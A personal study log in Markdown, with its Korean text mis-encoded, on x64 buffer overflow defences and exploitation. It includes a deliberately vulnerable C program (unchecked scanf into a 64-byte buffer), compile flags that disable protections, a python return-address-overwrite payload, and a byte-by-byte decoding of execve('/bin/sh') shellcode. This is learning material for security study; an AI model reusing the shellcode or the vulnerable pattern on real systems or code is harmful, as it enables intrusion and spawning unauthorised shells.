# ğŸ“… YYYY.MM.DD Study Log

## ğŸ“Œ ì˜¤ëŠ˜ ë°°ìš´ ê°œë… ìš”ì•½

- 
- 
- 

---

## âœ… Buffer Overflow ë°©ì–´ ê¸°ìˆ  (ì •ë¦¬ ì˜ˆì‹œ)

###rax, rbx, rsp, rbp ë¥¼ ë°°ì› ë‹¤.


##x64 í™˜ê²½ì—ì„œ ì¡´ì¬í•˜ëŠ” BOF ë°©ì–´ ê¸°ë²•ë“¤
1. **Canary** => sfp,ret ì˜ ì •ë³´ë¥¼ ì €ì¥í•  ë•Œ, bofê³µê²©ìœ¼ë¡œ ë®ì–´ì”Œì–´ì§€ëŠ” ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•´ sfpì™€ buffer ì‚¬ì´ì— ì„ì˜ì˜ ê°’ì„ ì¶”ê°€í•¨. ì´ê²Œ ë³€ì¡°ëœë‹¤? ==> bofë¡œ íƒì§€.
2. **ASLR**(Address Space Layout Randomization) ==> ë©”ëª¨ë¦¬ ëœë¤í™”.
3. **PIE**(Position Independent Execution)
4. **NX**(Non excutable)

![image](https://github.com/user-attachments/assets/2c709cf7-8554-41fd-89d6-5c266a306a07)
![image](https://github.com/user-attachments/assets/d963f3ad-1d72-4610-b77e-2642e1d5ccee)


#include <stdio.h>

void secret(){
        printf("You hacked me!\n");
}
int main(){
        char buf[64];

        printf("Input: ");
        scanf("%s", buf);

        printf("You typed: %s\n", buf);

        return 0;
}

í•´ë‹¹ ì½”ë“œì˜ scanfì˜ ì·¨ì•½ì ì„ í™œìš©í•˜ë ¤ bofë¥¼ ì‹œë„í–ˆë‹¤.
ì¡°ê±´ 

$gcc -g -fno-stack-protector -no-pie -o bof1 bof1.c
==> canary, aslr

íŒŒì¼ì— ì„¤ì •ëœ ë³´í˜¸ê¸°ë²• í™•ì¸?
checksec --file=íŒŒì¼ëª…

payload ì‘ì„±
buffer[64] + SFP[8] + ë®ì–´ì“¸ ì£¼ì†Œ[8]

gdb ./bof1
p $secret ==> secret í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ìŒ.
python3 -c 'print("A"*64 + "B"*8 + "í•´ë‹¹ ì£¼ì†Œ")' | ./bof1
//ì¶œë ¥: You hacked me!  

í™•ì¸í•´ë³´ë‹ˆ NXê°€ ì¼œì ¸ìˆë‹¤. ë‹¤ë§Œ NXëŠ” ìŠ¤íƒì—ì„œ ì‹¤í–‰ë˜ëŠ” ì‰˜ì½”ë“œë¥¼ ë§‰ëŠ” ê²ƒ! ë‚˜ëŠ” ê·¸ëƒ¥ ì£¼ì†Œë§Œ ë„£ì—ˆì„ ë¿.




ë¨¸ì‹ ì½”ë“œ?
\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
***\x48\x31\xc0***
\x48 ==> REX prefix ==> 64ë¹„íŠ¸ ì—°ì‚°í•œë‹¤. rax rbx ì“¸ê±°ë‹¤?
\x31 ==> opcode 
\xc0 ==> ModR/M ë°”ì´íŠ¸. (rax ë‘ê°œ ì“¸ê±°ë‹¤
       =xor rax, rax
       
***\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00***
\x48 ==> REX prefix
\xbb ==> mov r64,imm64  OR  mov r32,imm32      ==> ë¯¸ë¦¬ prifix í•´ë‘ì—ˆê¸°ì— movabs rbx, imm64 (ë§Œì•½ ì—†ìœ¼ë©´ 32bitë¡œ ì“°ì„)
\x2f\x62\x69\x6e\x2f\x73\x68\x00 ==> ë¦¬í‹€ì—”ë””ì–¸ìœ¼ë¡œ '/bin/sh\0'
       =movabs rbx, 0x0068732f6e69622f
***\x53***
\x53 ==> push rbx (ë¦¬í‹€ì—”ë””ì–¸ í˜•ì‹ìœ¼ë¡œ ì €ì¥!!! )
       = push rbx
***\x48\x89\xe7***
\x48
\x89 ==> mov r/m64, r64 "ì˜¤ë¥¸ìª½ ë ˆì§€ìŠ¤í„° ê°’ì„ ì™¼ìª½ì— ë³µì‚¬."
\xe7 ==> 11100111 mod = 11, reg = 100, rsp = 111
       = mov rdi, rsp (rdi ë ˆì§€ìŠ¤í„°ì— /bin/sh ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ë„£ìŒ)
(ì°¸ê³ ìë£Œ)
![image](https://github.com/user-attachments/assets/00e78af8-872f-436e-aa93-639cd4fa5b7d)
![image](https://github.com/user-attachments/assets/1ab48fb3-2ebc-4576-b025-982a90972a25)

EAX	ECX	EDX	EBX	ESP	EBP	ESI	EDI
000	001	010	011	100	101	110	111

      
***\x48\x31\xf6***
\x48 ìµìˆ™í•˜ì£ ?
\x31 ==> opcode xor r/m64, r64
\xf6 ==> 11110110 mod = 11, reg = 000???, rm = 110
       = xor rsi, rsi (rsi ë ˆì§€ìŠ¤í„°ë¥¼ 0ìœ¼ë¡œ ì´ˆê¸°í™” = execveì˜ ë‘ë²ˆì§¸ ì¸ì NULL)

***\x48\x31\xd2***
\x48
\x31
\xd2 ==> mod = 11010010 mod = 11, reg = 010, rm = 010
      = xor rdx, rdx (rdx ë ˆì§€ìŠ¤í„°ë¥¼ 0ìœ¼ë¡œ ì´ˆê¸°í™” = 3ë²ˆì§¸ ì¸ì NULL)
***\xb0\x3b***
\xb0 ==> mov al, immm8 (8ë¹„íŠ¸ë¥¼ alì— ë„£ëŠ”ë‹¤.)
\x3b ==> 59(system call number 59.== execve)
      = mov al, 0x3b

ì‹œìŠ¤í…œì½œ ë„˜ë²„ëŠ”
/usr/include/x86_64-linux-gnu/asm/unistd_64.h ì—¬ê¸°ì„œ  catí•´ì„œ ì°¾ì•„ë³´ë©´ ë¨.

***\x0f\x05***
      = syscall (opcode)

ëª¨ë‘ í•©ì¹˜ë©´?
xor rax, rax
movabs rbx,  0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall 




---

## ğŸ§  ì˜¤ëŠ˜ì˜ ëŠë‚€ ì  â˜‘ï¸


---
## â“ ì˜¤ëŠ˜ì˜ ê¶ê¸ˆí•œ ì  ğŸ”


---

## ğŸ”– ë‚´ì¼ ëª©í‘œ ğŸ¯

- [ ] CTF ë¬¸ì œ 1ê°œ í’€ê³  write-up ì‘ì„±
- [ ] ì˜¤ëŠ˜ì˜ ê¶ê¸ˆí•œ ì  ì¤‘ 1ê°œëŠ” gdbë¡œ ì‹¤í—˜
- [ ] ì‰˜ì½”ë“œ íë¦„ ë³µìŠµ ë° ì‹œê°í™” ì •ë¦¬


